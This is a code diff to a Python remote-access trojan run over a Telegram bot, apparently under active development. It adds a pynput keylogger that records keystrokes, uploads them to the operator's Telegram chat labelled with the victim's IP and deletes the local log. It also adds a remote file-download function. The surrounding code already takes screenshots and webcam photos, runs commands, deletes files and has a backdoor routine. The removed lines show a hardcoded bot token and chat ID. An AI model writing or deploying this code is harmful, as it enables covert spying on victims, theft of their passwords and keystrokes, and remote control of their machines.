@@ -9,12 +9,14 @@ import shutil
 import getpass
 import winshell
 import webbrowser
+import logging
+import pynput
 
 commands = []
 
 #Basic bot stuff
-TOKEN = '5578114547:AAGGe8WEycX1S4B_ewJZkbmGoIxdWdrZV04'
-CHAT_ID = '-1001460193965'
+TOKEN = ''
+CHAT_ID = ''
 api_url = f'https://api.telegram.org/bot{TOKEN}/getUpdates'
 #Ip address
 ip = socket.gethostbyname(socket.gethostname())
@@ -45,7 +47,6 @@ def backdoor():
     except:
         send_message("Cannot send backdoor!")
 
-
 #Screenshot fucntion
 PHOTO_PATH = f'{Appdata}\Microsoft\Windows\pic.png'
 def take_screenshot():
@@ -74,7 +75,7 @@ def Webcam_Picture():
         cv2.destroyAllWindows()
 
         files = {'photo' :open(PHOTo_PATH,'rb')}
-        resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={CHAT_ID}",files=files )
+        resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={CHAT_ID}",files=files)
     except:
         send_message("Cannot take webcam picture: " + ip)
 #cd ..
@@ -95,18 +96,48 @@ def cdTo(dir):
         send_message("Error! check command..") 
 
 #Upload file 
-def upload_file(url):
-    try:
-        send_message("Uploading...")
-        r = requests.get(url, allow_redirects=True)
-        file_type = url.split(".")[-1]
-        open(f'test.{file_type}', 'wb').write(r.content)
-        send_message("File uploaded!")
+def download_file(url):
+    # get the file name from the URL
+    file_name = url.split("/")[-1]
 
-    except:
-        send_message("Could not upload file")
+    # download the file
+    response = requests.get(url)
+    response.raise_for_status()
 
+    # save the file
+    with open(file_name, "wb") as f:
+        f.write(response.content)
 
+#Keylogger function
+Log_PATH = f'{Appdata}\Microsoft\Windows\keylog.txt'
+def keylogger(timma):
+
+    f = open(Log_PATH, "w")
+
+    def on_press(key):
+        try:
+            key_str = str(key.char)
+        except AttributeError:
+            key_str = str(key)
+            f.write(" ")
+        f.write(key_str)
+    listener = pynput.keyboard.Listener(on_press=on_press)
+
+    listener.start()
+    time.sleep(timma)
+    listener.stop()
+
+    f.close()
+    with open(Log_PATH, "rb") as f:
+        data = f.read()
+
+    endpoint = 'https://api.telegram.org/bot{}/sendDocument'.format(TOKEN)
+
+    requests.post(endpoint, data={'chat_id': CHAT_ID}, files={'document': (f'file: {ip}.txt', data)})
+    time.sleep(1)
+    os.remove(Log_PATH)
+
+#Main function
 def getting_commands():
 
     with urllib.request.urlopen(api_url) as url:
@@ -119,17 +150,14 @@ def getting_commands():
     send_message(bot_name + ": " + ip)
     send_message("Type: '/start'")
 
-def open_url(url):
-    webbrowser.open(url)
-
     while True:
-
         time.sleep(2.3)
         
         with urllib.request.urlopen(api_url) as url:
             data = json.load(url)
-        #print(data)
+
         data1 = str(data)
+
         #Checking for ne messages
         lenData = str(data)
         lenData = len(lenData)
@@ -137,7 +165,7 @@ def open_url(url):
         if lenData > original_length:
             original_length = lenData
             
-            #Finding command from json api
+            #Finding command from api
             def find_commands():
                 command = []
                 count = 0
@@ -152,7 +180,6 @@ def open_url(url):
                 command = command[-1]
                 data = data1[command:]
 
-                #Getting only message
                 count = 0
 
                 for i in data:
@@ -173,6 +200,11 @@ def open_url(url):
             
             #Commands!
             match command:
+                case "/url":
+                    WholeCommand = WholeCommand.split()
+                    url = WholeCommand[-1]
+                    webbrowser.open(url)
+                    send_message("url opened")
                     
                 #list command
                 case "/list":
@@ -190,10 +222,22 @@ def open_url(url):
                         
                     elif "allbots" in WholeCommand:
                         take_screenshot()
-                        os.remove(PHOTO_PATH)
-                        
+                        os.remove(PHOTO_PATH)     
                     else:
                         pass
+
+                case "/keylogger":
+                    WholeCommand = WholeCommand.split()
+
+                    if ip in WholeCommand:
+                        count = WholeCommand[-1]
+                        count = int(count)
+                        keylogger(count)
+            
+                    elif "allbots" in WholeCommand:
+                        count = WholeCommand[-1]
+                        count = int(count)
+                        keylogger(count)
 
                 #Webcam command
                 case "/webcam":
@@ -232,15 +276,6 @@ def open_url(url):
                                 except:
                                     pass
 
-                #Upload command 
-                case "/upload":
-                    WholeCommand = WholeCommand.split()
-
-                    if ip in WholeCommand:
-                        url = WholeCommand[2]
-
-                        upload_file(url)
-
                 #Run command
                 case "/run":
                     WholeCommand = WholeCommand.split()
@@ -257,15 +292,8 @@ def open_url(url):
                     WholeCommand = WholeCommand.split()
 
                     if ip in WholeCommand:
-                        file = WholeCommand[2   ]
+                        file = WholeCommand[2]
                         os.remove(file)
-
-                #Open url 
-                case "/url":
-                    WholeCommand = WholeCommand.split()
-                    url = WholeCommand[-1]
-                    
-                    if ip in WholeCommand:
-                        open_url(url)                        
+                      
 getting_commands()
 
